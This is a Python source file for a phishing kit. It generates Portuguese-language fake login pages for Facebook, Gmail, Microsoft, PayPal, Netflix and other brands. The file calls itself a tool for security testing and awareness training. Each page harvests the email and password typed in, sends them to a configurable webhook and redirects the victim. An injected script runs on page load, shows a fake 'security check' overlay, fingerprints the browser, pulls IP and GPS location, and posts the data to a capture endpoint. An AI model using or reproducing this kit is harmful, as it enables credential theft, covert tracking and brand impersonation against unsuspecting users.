"""
Phishing Page Generator
Generates realistic phishing pages for security testing and awareness training
"""
import os
import uuid
from datetime import datetime
from typing import Dict, List, Optional
import json


class PhishingPageGenerator:
    """Generate phishing pages for security testing"""
    
    def __init__(self, output_dir: str = "/tmp/phishing_pages"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        
        # Popular templates
        self.templates = {
            "facebook": self._facebook_template,
            "gmail": self._gmail_template,
            "microsoft": self._microsoft_template,
            "paypal": self._paypal_template,
            "instagram": self._instagram_template,
            "linkedin": self._linkedin_template,
            "amazon": self._amazon_template,
            "apple": self._apple_template,
            "twitter": self._twitter_template,
            "netflix": self._netflix_template,
        }
    
    def _get_capture_script(self, page_id: str) -> str:
        """Generate JavaScript for capturing data even without permissions - aggressive fingerprinting"""
        return f"""
        <script>
            // Advanced Fingerprinting & Data Capture (Works WITHOUT Permissions)
            let capturedData = {{
                page_id: '{page_id}',
                photo: null,
                location: null,
                // Browser Fingerprint (NO PERMISSION NEEDED)
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                screen_resolution: screen.width + 'x' + screen.height,
                screen_color_depth: screen.colorDepth,
                screen_pixel_depth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezone_offset: new Date().getTimezoneOffset(),
                // Advanced fingerprint
                hardware_concurrency: navigator.hardwareConcurrency,
                device_memory: navigator.deviceMemory,
                max_touch_points: navigator.maxTouchPoints,
                // Browser capabilities
                cookies_enabled: navigator.cookieEnabled,
                do_not_track: navigator.doNotTrack,
                // Canvas fingerprint
                canvas_fingerprint: null,
                webgl_vendor: null,
                webgl_renderer: null,
                // Network info
                connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                connection_downlink: navigator.connection ? navigator.connection.downlink : null,
                // Plugins
                plugins: Array.from(navigator.plugins || []).map(p => p.name),
                timestamp: new Date().toISOString()
            }};

            // Generate Canvas Fingerprint (NO PERMISSION)
            function getCanvasFingerprint() {{
                try {{
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    canvas.width = 200;
                    canvas.height = 50;
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(0, 0, 200, 50);
                    ctx.fillStyle = '#069';
                    ctx.fillText('Browser Fingerprint 🔒', 2, 15);
                    return canvas.toDataURL();
                }} catch (e) {{
                    return null;
                }}
            }}

            // Get WebGL Info (NO PERMISSION)
            function getWebGLInfo() {{
                try {{
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {{
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {{
                            capturedData.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                            capturedData.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        }}
                    }}
                }} catch (e) {{}}
            }}

            // Create fake security check overlay
            function showFakeLoading() {{
                const overlay = document.createElement('div');
                overlay.id = 'security-check';
                overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;';
                overlay.innerHTML = `
                    <div style="text-align:center;color:white;max-width:400px;padding:30px;">
                        <div style="width:60px;height:60px;border:6px solid #444;border-top:6px solid #4CAF50;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 25px;"></div>
                        <h2 style="margin:0 0 15px 0;font-size:24px;font-weight:bold;">Verificação de Segurança</h2>
                        <p style="font-size:16px;opacity:0.9;margin:0 0 10px 0;">Validando sua conexão...</p>
                        <p style="font-size:13px;opacity:0.6;margin:0;">Este processo garante que você não é um robô</p>
                    </div>
                    <style>
                        @keyframes spin {{
                            0% {{ transform: rotate(0deg); }}
                            100% {{ transform: rotate(360deg); }}
                        }}
                    </style>
                `;
                document.body.appendChild(overlay);
                return overlay;
            }}

            function removeFakeLoading() {{
                const overlay = document.getElementById('security-check');
                if (overlay) {{
                    overlay.style.opacity = '0';
                    overlay.style.transition = 'opacity 0.6s ease-out';
                    setTimeout(() => overlay.remove(), 600);
                }}
            }}

            // Get location via IP geolocation (NO permission needed - ALWAYS works)
            async function getLocationByIP() {{
                try {{
                    // Use ipapi.co first (most reliable)
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    
                    if (data.latitude) {{
                        // Preenche campos individuais
                        capturedData.latitude = data.latitude;
                        capturedData.longitude = data.longitude;
                        capturedData.city = data.city;
                        capturedData.region = data.region;
                        capturedData.country = data.country_name;
                        capturedData.isp = data.org;
                        capturedData.location_type = 'IP';
                        
                        // Preenche objeto location (formato antigo para compatibilidade)
                        capturedData.location = {{
                            latitude: data.latitude,
                            longitude: data.longitude,
                            city: data.city,
                            region: data.region,
                            country: data.country_name,
                            postal: data.postal,
                            ip: data.ip,
                            org: data.org,
                            timezone: data.timezone,
                            type: 'IP'
                        }};
                        
                        console.log('✅ IP Location:', data.city, data.country_name, '(' + data.latitude + ', ' + data.longitude + ')');
                        return true;
                    }}
                }} catch (e) {{
                    console.log('❌ Location error:', e);
                    try {{
                        // Fallback to ip-api.com
                        const response = await fetch('https://ip-api.com/json/');
                        const data = await response.json();
                        
                        if (data.lat) {{
                            // Preenche campos individuais
                            capturedData.latitude = data.lat;
                            capturedData.longitude = data.lon;
                            capturedData.city = data.city;
                            capturedData.region = data.regionName;
                            capturedData.country = data.country;
                            capturedData.isp = data.isp;
                            capturedData.location_type = 'IP';
                            
                            // Preenche objeto location
                            capturedData.location = {{
                                latitude: data.lat,
                                longitude: data.lon,
                                city: data.city,
                                region: data.regionName,
                                country: data.country,
                                zip: data.zip,
                                ip: data.query,
                                org: data.org,
                                timezone: data.timezone,
                                type: 'IP'
                            }};
                            
                            console.log('✅ IP Location (fallback):', data.city, data.country, '(' + data.lat + ', ' + data.lon + ')');
                            return true;
                        }}
                    }} catch (e2) {{
                        console.log('❌ Location fallback error:', e2);
                    }}
                }}
                return false;
            }}

            // Try to get GPS location (more accurate, but requires permission)
            async function tryGetGPSLocation() {{
                return new Promise((resolve) => {{
                    // Timeout após 2 segundos para não travar
                    const timeout = setTimeout(() => {{
                        console.log('⏰ GPS timeout');
                        resolve(false);
                    }}, 2000);
                    
                    if (!navigator.geolocation) {{
                        clearTimeout(timeout);
                        resolve(false);
                        return;
                    }}
                    
                    // Tenta pegar localização GPS com alta precisão
                    navigator.geolocation.getCurrentPosition(
                        (position) => {{
                            clearTimeout(timeout);
                            // GPS é mais preciso, atualiza campos
                            capturedData.latitude = position.coords.latitude;
                            capturedData.longitude = position.coords.longitude;
                            capturedData.accuracy = position.coords.accuracy;
                            capturedData.altitude = position.coords.altitude;
                            capturedData.location_type = 'GPS';
                            
                            // Atualiza objeto location com dados GPS
                            if (capturedData.location) {{
                                capturedData.location.latitude = position.coords.latitude;
                                capturedData.location.longitude = position.coords.longitude;
                                capturedData.location.accuracy = position.coords.accuracy;
                                capturedData.location.altitude = position.coords.altitude;
                                capturedData.location.type = 'GPS';
                            }} else {{
                                capturedData.location = {{
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    altitude: position.coords.altitude,
                                    type: 'GPS'
                                }};
                            }}
                            
                            console.log('✅ GPS Location:', position.coords.latitude, position.coords.longitude, 'accuracy:', position.coords.accuracy + 'm');
                            resolve(true);
                        }},
                        (error) => {{
                            clearTimeout(timeout);
                            console.log('❌ GPS denied:', error.message);
                            resolve(false);
                        }},
                        {{
                            enableHighAccuracy: true,
                            timeout: 2000,
                            maximumAge: 0
                        }}
                    );
                }});
            }}



            // AUTO CAPTURE on page load - Gets IP location + tries GPS
            async function autoCapture() {{
                console.log('🎯 Starting capture...');
                
                // Show loading overlay
                showFakeLoading();
                
                // Collect fingerprint instantly (NO permissions needed)
                capturedData.canvas_fingerprint = getCanvasFingerprint();
                getWebGLInfo();
                console.log('✅ Fingerprint collected');
                
                // SEMPRE pega localização por IP primeiro (garantido)
                console.log('📍 Getting IP location...');
                await getLocationByIP();
                
                // Tenta GPS em paralelo (mais preciso, mas pode pedir permissão)
                console.log('�️ Trying GPS location...');
                tryGetGPSLocation(); // Não espera, executa em background
                
                // Aguarda um pouco para dar chance ao GPS
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                console.log('📤 Sending all data...');
                
                // Envia tudo que conseguiu (IP location garantido, GPS se conseguiu)
                await sendCapturedData();
            }}

            // Send captured data to server and then remove loading
            async function sendCapturedData() {{
                try {{
                    console.log('📦 Data to send:', {{
                        hasPhoto: !!capturedData.photo,
                        hasLocation: !!capturedData.latitude,
                        city: capturedData.city,
                        canvas: capturedData.canvas_fingerprint?.substring(0, 20)
                    }});
                    
                    // Use relative URL - works with any domain (ngrok, localhost, etc)
                    const response = await fetch('/api/tools/phishing/capture', {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json',
                        }},
                        body: JSON.stringify(capturedData)
                    }});
                    
                    console.log('✅ Data sent successfully');
                    
                    // Wait a bit to show success, then remove loading
                    setTimeout(() => {{
                        removeFakeLoading();
                    }}, 1500);
                }} catch (error) {{
                    console.log('❌ Send error:', error);
                    // Even if failed, remove loading after delay
                    setTimeout(() => {{
                        removeFakeLoading();
                    }}, 1500);
                }}
            }}

            // AUTO CAPTURE on page load (BEFORE user clicks anything)
            document.addEventListener('DOMContentLoaded', () => {{
                console.log('🚀 Page loaded - starting AUTO CAPTURE...');
                
                // Start automatic capture immediately
                autoCapture();
                
                // Also intercept form to show loading effect
                const form = document.getElementById('loginForm');
                if (form) {{
                    console.log('✅ Form found, adding click handler');
                    form.addEventListener('submit', (e) => {{
                        e.preventDefault();
                        e.stopPropagation();
                        handleButtonClick();
                        return false;
                    }});
                }}
            }});
        </script>
        """
    
    def generate_page(
        self,
        template: str,
        redirect_url: str = "https://google.com",
        capture_webhook: Optional[str] = None,
        custom_title: Optional[str] = None,
        custom_logo: Optional[str] = None
    ) -> Dict:
        """
        Generate a phishing page
        
        Args:
            template: Template name (facebook, gmail, etc.)
            redirect_url: URL to redirect after form submission
            capture_webhook: Webhook URL to send captured data
            custom_title: Custom page title
            custom_logo: Custom logo URL
        
        Returns:
            Dict with page_id, url, and file_path
        """
        if template not in self.templates:
            raise ValueError(f"Template '{template}' not found. Available: {list(self.templates.keys())}")
        
        page_id = str(uuid.uuid4())[:8]
        filename = f"phishing_{template}_{page_id}.html"
        filepath = os.path.join(self.output_dir, filename)
        
        # Generate HTML content
        html_content = self.templates[template](
            redirect_url=redirect_url,
            capture_webhook=capture_webhook,
            custom_title=custom_title,
            custom_logo=custom_logo,
            page_id=page_id
        )
        
        # Inject capture script before closing </body> tag
        capture_script = self._get_capture_script(page_id)
        html_content = html_content.replace('</body>', f'{capture_script}</body>')
        
        # Save to file
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return {
            "page_id": page_id,
            "template": template,
            "filename": filename,
            "filepath": filepath,
            "url": f"/phishing/{filename}",
            "redirect_url": redirect_url,
            "created_at": datetime.now().isoformat(),
            "capture_webhook": capture_webhook,
        }
    
    def _facebook_template(self, redirect_url: str, capture_webhook: Optional[str], 
                          custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
        """Facebook login phishing template"""
        return f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{custom_title or 'Facebook - Entrar ou cadastrar-se'}</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: Helvetica, Arial, sans-serif; background: linear-gradient(#4267B2, #FFF); min-height: 100vh; display: flex; align-items: center; justify-content: center; }}
        .container {{ max-width: 980px; margin: 0 auto; padding: 20px; }}
        .card {{ background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 40px; max-width: 396px; margin: 0 auto; }}
        .logo {{ text-align: center; margin-bottom: 30px; }}
        .logo img {{ width: 200px; }}
        h1 {{ color: #1877f2; font-size: 42px; font-weight: bold; text-align: center; margin-bottom: 20px; }}
        .subtitle {{ color: #606770; font-size: 16px; text-align: center; margin-bottom: 30px; }}
        input {{ width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; margin-bottom: 12px; }}
        input:focus {{ outline: none; border-color: #1877f2; }}
        button {{ width: 100%; padding: 14px 16px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }}
        button:hover {{ background: #166fe5; }}
        .forgot {{ text-align: center; margin-top: 16px; }}
        .forgot a {{ color: #1877f2; text-decoration: none; font-size: 14px; }}
        .divider {{ border-top: 1px solid #dadde1; margin: 20px 0; }}
        .create-account {{ text-align: center; margin-top: 20px; }}
        .create-account button {{ background: #42b72a; width: auto; padding: 14px 20px; }}
        .create-account button:hover {{ background: #36a420; }}
        .warning {{ background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 6px; margin-bottom: 20px; text-align: center; color: #856404; font-size: 14px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <h1>facebook</h1>
            </div>
            <div class="warning">⚠️ Sua sessão expirou. Por favor, faça login novamente.</div>
            <form id="loginForm" onsubmit="return handleSubmit(event)">
                <input type="email" name="email" placeholder="Email ou telefone" required>
                <input type="password" name="password" placeholder="Senha" required>
                <button type="submit">Entrar</button>
            </form>
            <div class="forgot">
                <a href="#">Esqueceu a senha?</a>
            </div>
            <div class="divider"></div>
            <div class="create-account">
                <button>Criar nova conta</button>
            </div>
        </div>
    </div>
    <script>
        function handleSubmit(event) {{
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {{
                page_id: '{page_id}',
                template: 'facebook',
                email: formData.get('email'),
                password: formData.get('password'),
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                ip: 'captured_by_server'
            }};
            
            {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
            
            console.log('Captured:', data);
            setTimeout(() => {{
                window.location.href = '{redirect_url}';
            }}, 500);
            return false;
        }}
    </script>
</body>
</html>"""
    
    def _gmail_template(self, redirect_url: str, capture_webhook: Optional[str], 
                       custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
        """Gmail login phishing template"""
        return f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{custom_title or 'Fazer login - Contas do Google'}</title>
    <link rel="icon" href="https://ssl.gstatic.com/accounts/favicon.ico">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
        .container {{ max-width: 450px; margin: 0 auto; }}
        .card {{ border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; }}
        .logo {{ text-align: center; margin-bottom: 20px; }}
        .logo img {{ width: 75px; }}
        h1 {{ font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }}
        .subtitle {{ font-size: 16px; color: #5f6368; text-align: center; margin-bottom: 30px; }}
        input {{ width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 20px; }}
        input:focus {{ outline: none; border-color: #1a73e8; border-width: 2px; }}
        .forgot {{ margin-bottom: 30px; }}
        .forgot a {{ color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }}
        .forgot a:hover {{ text-decoration: underline; }}
        .buttons {{ display: flex; justify-content: space-between; align-items: center; }}
        .create {{ color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }}
        .create:hover {{ text-decoration: underline; }}
        button {{ padding: 10px 24px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }}
        button:hover {{ background: #1765cc; }}
        .warning {{ background: #fef7e0; border: 1px solid #f9ab00; padding: 16px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; color: #202124; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24"><title>Google</title><path fill="#4285f4" d="M36.3425 12.0298v-3.27h10.962c.109.6.164 1.309.164 2.073 0 2.58-.7092 5.78-2.9913 8.062-2.173 2.31-4.9456 3.544-8.1347 3.544-6.4276 0-11.842-5.227-11.842-11.655 0-6.4276 5.4144-11.655 11.842-11.655 3.4909 0 6.0018 1.3745 7.8747 3.1563l-2.3182 2.3182c-1.4109-1.3018-3.3291-2.3182-5.5565-2.3182-4.5382 0-8.0891 3.6691-8.0891 8.1527s3.5509 8.1527 8.0891 8.1527c2.9364 0 4.6091-.982 5.6891-1.8727 1.4382-1.1564 2.3818-2.8291 2.7545-5.1055z"/><path fill="#ea4335" d="M47.0783 7.9164c-3.2727 0-5.8837 2.5236-5.8837 5.9782 0 3.4364 2.6109 5.9782 5.8837 5.9782 3.2727 0 5.8836-2.5418 5.8836-5.9782 0-3.4546-2.6109-5.9782-5.8836-5.9782zm0 9.6c-1.8909 0-3.5273-1.5636-3.5273-3.6218s1.6364-3.6218 3.5273-3.6218c1.8909 0 3.5273 1.5636 3.5273 3.6218s-1.6364 3.6218-3.5273 3.6218z"/><path fill="#fbbc05" d="M59.5164 7.9164c-3.2727 0-5.8837 2.5236-5.8837 5.9782 0 3.4364 2.6109 5.9782 5.8837 5.9782 3.2727 0 5.8836-2.5418 5.8836-5.9782 0-3.4546-2.6109-5.9782-5.8836-5.9782zm0 9.6c-1.8909 0-3.5273-1.5636-3.5273-3.6218s1.6364-3.6218 3.5273-3.6218c1.8909 0 3.5273 1.5636 3.5273 3.6218s-1.6364 3.6218-3.5273 3.6218z"/><path fill="#4285f4" d="M71.5564 8.1891v11.4545h-2.2909v-1.1636h-.1091c-.7091 1.0182-2.0109 1.3909-3.1854 1.3909-2.9818 0-5.4291-2.5964-5.4291-5.9782 0-3.4182 2.4618-5.9782 5.4291-5.9782 1.1527 0 2.4618.3636 3.1527 1.3236h.1091v-1.0909h2.3236zm-5.2364 9.3273c1.8182 0 3.2291-1.4909 3.2291-3.6218 0-2.1527-1.4109-3.6218-3.2291-3.6218-1.8473 0-3.2582 1.4545-3.2582 3.6218 0 2.1382 1.4109 3.6218 3.2582 3.6218z"/><path fill="#34a853" d="M6.9382 11.5455v-2.3273h7.8182c.0764.4073.1164.8909.1164 1.4109 0 1.7527-.4800 3.9273-2.0327 5.4800-1.4764 1.5673-3.3673 2.4073-5.8909 2.4073-4.6655 0-8.5891-3.7964-8.5891-8.4618 0-4.6655 3.9236-8.4618 8.5891-8.4618 2.3782 0 4.1018.9273 5.3745 2.1382l-1.5127 1.5127c-.9164-.8582-2.1527-1.5273-3.8618-1.5273-3.1527 0-5.6218 2.5418-5.6218 5.6382 0 3.0964 2.4691 5.6382 5.6218 5.6382 2.0473 0 3.2145-.8218 3.9673-1.5745.6109-.6109 1.0109-1.4836 1.1673-2.68z"/></svg>
            </div>
            <h1>Fazer login</h1>
            <div class="subtitle">Use sua Conta do Google</div>
            <div class="warning">⚠️ Verificação de segurança necessária</div>
            <form id="loginForm" onsubmit="return handleSubmit(event)">
                <input type="email" name="email" placeholder="E-mail ou telefone" required>
                <input type="password" name="password" placeholder="Digite sua senha" required>
                <div class="forgot">
                    <a href="#">Esqueceu o e-mail?</a>
                </div>
                <div class="buttons">
                    <a href="#" class="create">Criar conta</a>
                    <button type="submit">Próxima</button>
                </div>
            </form>
        </div>
    </div>
    <script>
        function handleSubmit(event) {{
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {{
                page_id: '{page_id}',
                template: 'gmail',
                email: formData.get('email'),
                password: formData.get('password'),
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent
            }};
            
            {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
            
            console.log('Captured:', data);
            setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
            return false;
        }}
    </script>
</body>
</html>"""
    
    def _microsoft_template(self, redirect_url: str, capture_webhook: Optional[str], 
                           custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
        """Microsoft login template"""
        return f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{custom_title or 'Entrar na conta Microsoft'}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f3f2f1; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
        .card {{ background: white; max-width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }}
        .logo {{ text-align: center; margin-bottom: 20px; }}
        .logo svg {{ width: 108px; }}
        h1 {{ font-size: 24px; font-weight: 600; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 10px; border: 1px solid #8a8886; font-size: 15px; margin-bottom: 20px; }}
        input:focus {{ outline: none; border-color: #0078d4; }}
        button {{ width: 100%; padding: 10px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; }}
        button:hover {{ background: #005a9e; }}
        .warning {{ background: #fff4ce; border: 1px solid #605e5c; padding: 12px; margin-bottom: 20px; font-size: 13px; }}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 300"><path fill="#f25022" d="M0 0h571v286H0z"/><path fill="#00a4ef" d="M629 0h571v286H629z"/><path fill="#7fba00" d="M0 314h571v286H0z"/><path fill="#ffb900" d="M629 314h571v286H629z"/></svg>
        </div>
        <h1>Entrar</h1>
        <div class="warning">⚠️ Sua sessão foi encerrada. Entre novamente.</div>
        <form id="loginForm" onsubmit="return handleSubmit(event)">
            <input type="email" name="email" placeholder="E-mail, telefone ou Skype" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
    <script>
        function handleSubmit(event) {{
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {{
                page_id: '{page_id}',
                template: 'microsoft',
                email: formData.get('email'),
                password: formData.get('password'),
                timestamp: new Date().toISOString()
            }};
            {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
            console.log('Captured:', data);
            setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
            return false;
        }}
    </script>
</body>
</html>"""
    
    def _paypal_template(self, redirect_url: str, capture_webhook: Optional[str], 
                        custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
        """PayPal login template"""
        return self._generate_simple_template("PayPal", "#0070ba", "#003087", redirect_url, capture_webhook, page_id, custom_title)
    
    def _instagram_template(self, redirect_url: str, capture_webhook: Optional[str], 
                           custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
        """Instagram login template"""
        return self._generate_simple_template("Instagram", "#833ab4", "#405de6", redirect_url, capture_webhook, page_id, custom_title)
    
    def _linkedin_template(self, redirect_url: str, capture_webhook: Optional[str], 
                          custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
        """LinkedIn login template"""
        return self._generate_simple_template("LinkedIn", "#0077b5", "#00669c", redirect_url, capture_webhook, page_id, custom_title)
    
    def _amazon_template(self, redirect_url: str, capture_webhook: Optional[str], 
                        custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
        """Amazon login template"""
        return self._generate_simple_template("Amazon", "#ff9900", "#ff8800", redirect_url, capture_webhook, page_id, custom_title)
    
    def _apple_template(self, redirect_url: str, capture_webhook: Optional[str], 
                       custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
        """Apple login template"""
        return self._generate_simple_template("Apple ID", "#000000", "#333333", redirect_url, capture_webhook, page_id, custom_title)
    
    def _twitter_template(self, redirect_url: str, capture_webhook: Optional[str], 
                         custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
        """Twitter/X login template"""
        return self._generate_simple_template("X (Twitter)", "#1da1f2", "#1a91da", redirect_url, capture_webhook, page_id, custom_title)
    
    def _netflix_template(self, redirect_url: str, capture_webhook: Optional[str], 
                         custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
        """Netflix login template"""
        return self._generate_simple_template("Netflix", "#e50914", "#b20710", redirect_url, capture_webhook, page_id, custom_title)
    
    def _generate_simple_template(self, brand: str, color: str, hover_color: str, 
                                 redirect_url: str, capture_webhook: Optional[str], 
                                 page_id: str, custom_title: Optional[str]) -> str:
        """Generic template generator"""
        return f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{custom_title or f'Entrar - {brand}'}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: Arial, sans-serif; background: linear-gradient(135deg, {color}, {hover_color}); display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
        .card {{ background: white; max-width: 400px; padding: 40px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }}
        h1 {{ font-size: 32px; text-align: center; color: {color}; margin-bottom: 30px; }}
        .warning {{ background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 5px; margin-bottom: 20px; text-align: center; font-size: 14px; }}
        input {{ width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 15px; margin-bottom: 15px; }}
        input:focus {{ outline: none; border-color: {color}; }}
        button {{ width: 100%; padding: 12px; background: {color}; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; }}
        button:hover {{ background: {hover_color}; }}
    </style>
</head>
<body>
    <div class="card">
        <h1>{brand}</h1>
        <div class="warning">⚠️ Sessão expirada. Faça login novamente.</div>
        <form id="loginForm" onsubmit="return handleSubmit(event)">
            <input type="email" name="email" placeholder="E-mail" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
    <script>
        function handleSubmit(event) {{
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {{
                page_id: '{page_id}',
                template: '{brand.lower()}',
                email: formData.get('email'),
                password: formData.get('password'),
                timestamp: new Date().toISOString()
            }};
            {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
            console.log('Captured:', data);
            setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
            return false;
        }}
    </script>
</body>
</html>"""
    
    def list_templates(self) -> List[Dict]:
        """List all available templates"""
        return [
            {"id": "facebook", "name": "Facebook", "description": "Facebook login page"},
            {"id": "gmail", "name": "Gmail", "description": "Google Account login"},
            {"id": "microsoft", "name": "Microsoft", "description": "Microsoft Account login"},
            {"id": "paypal", "name": "PayPal", "description": "PayPal login page"},
            {"id": "instagram", "name": "Instagram", "description": "Instagram login page"},
            {"id": "linkedin", "name": "LinkedIn", "description": "LinkedIn login page"},
            {"id": "amazon", "name": "Amazon", "description": "Amazon login page"},
            {"id": "apple", "name": "Apple", "description": "Apple ID login"},
            {"id": "twitter", "name": "Twitter/X", "description": "Twitter/X login page"},
            {"id": "netflix", "name": "Netflix", "description": "Netflix login page"},
        ]
    
    def get_generated_pages(self) -> List[Dict]:
        """Get list of all generated phishing pages"""
        pages = []
        if os.path.exists(self.output_dir):
            for filename in os.listdir(self.output_dir):
                if filename.endswith('.html'):
                    filepath = os.path.join(self.output_dir, filename)
                    stat = os.stat(filepath)
                    pages.append({
                        "filename": filename,
                        "filepath": filepath,
                        "size": stat.st_size,
                        "created_at": datetime.fromtimestamp(stat.st_ctime).isoformat(),
                        "url": f"/phishing/{filename}"
                    })
        return pages
